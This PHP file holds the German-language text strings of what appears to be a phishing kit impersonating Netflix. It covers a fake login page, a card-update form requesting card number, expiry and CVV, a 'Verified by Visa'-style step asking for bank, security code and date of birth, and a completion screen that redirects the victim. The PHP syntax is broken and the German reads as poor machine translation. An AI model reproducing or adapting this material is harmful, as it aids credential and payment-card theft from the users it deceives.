<? php
    $ lg_tr = [
                 'head' => "Anmelden",
                 'msg' => "<b> Falsche E-Mail oder falsches Passwort </ b>. Bitte versuchen Sie es erneut.",
                 'lbl_eml' => "Email",
                 'msg_eml' => "Bitte geben Sie eine gültige E-Mail-Adresse oder Telefonnummer ein.",
                 'lbl_pss' => "Passwort",
                 'msg_pss' => "Ihr Passwort muss zwischen 4 und 60 Zeichen enthalten.",
                 'show_pss' => "SHOW",
                 'hide_pss' => "HIDE",
                 'erinnere dich' => "Erinnere dich an mich",
                 'help' => "Benötigen Sie Hilfe?",
                 'fb' => "Mit Facebook anmelden",
                 'new' => "Neu bei Netflix?",
                 'signup' => "Jetzt anmelden",
                 'contact' => "Fragen? Kontaktieren Sie uns.",
                 'Geschenk' => "Geschenkkartenbedingungen",
                 'Terms' => "Nutzungsbedingungen",
                 'privacy' => "Datenschutzerklärung"
    ];

    $ info_tr = [
        'abmelden' => "abmelden",
        'update' => "Aktualisieren Sie Ihre Kredit- oder Debitkarte.",
        'by' => "Durch die Aktualisierung Ihrer Mitgliedschaft profitieren Sie von allen Kontovorteilen und -vorteilen",
        'erforderlich' => "ist erforderlich!",
        'fname' => "Vorname",
        'lname' => "Nachname",
        'adr' => "Rechnungsadresse",
        'Stadt' => "Stadt",
        'state' => "State",
        'Land' => "Land",
        'zip' => "Postleitzahl der Abrechnung",
        'phone' => "Telefonnummer",
         'cnm' => "Kartennummer",
        'cnm_check' => "Geben Sie eine gültige Kartenkreditnummer ein.",
        'exp' => "Ablaufdatum (MM / JJ)",
        'csc' => "Sicherheitscode (CVV)",
        'save' => "SAVE",
        'csc_msg' => "Der Sicherheitscode (CVV) Ihrer Karte ist die 3- oder 4-stellige Nummer auf der Rückseite der meisten Karten.",
        'faq' => "FAQ",
        'help_center' => "Hilfezentrum",
        'Cookies' => "Cookie-Einstellungen",
        'Corporate' => "Unternehmensinformationen"
    ];

    $ vbv_tr = [
        'sec' => "Bitte geben Sie Ihren Sicherheitscode ein",
        'full_name' => "Full name",
        'bnk' => "Bank",
        'crd' => "Kreditkarte",
        'dob' => "Geburtsdatum",
        'submit' => "Submit"
    ];

    $ finish_tr = [
       'step' => "SCHRITT 3 VON 3 DONE </ b>",
       'success' => "Konto mit Erfolg aktualisiert",
       'redirect' => "Ihr Testament wird nach 5 Sekunden in unsere Privatsphäre weitergeleitet. Bitte lesen Sie das vollständige Thema.",
       'bt' => "UNSERE DATENSCHUTZ"
    ];
?>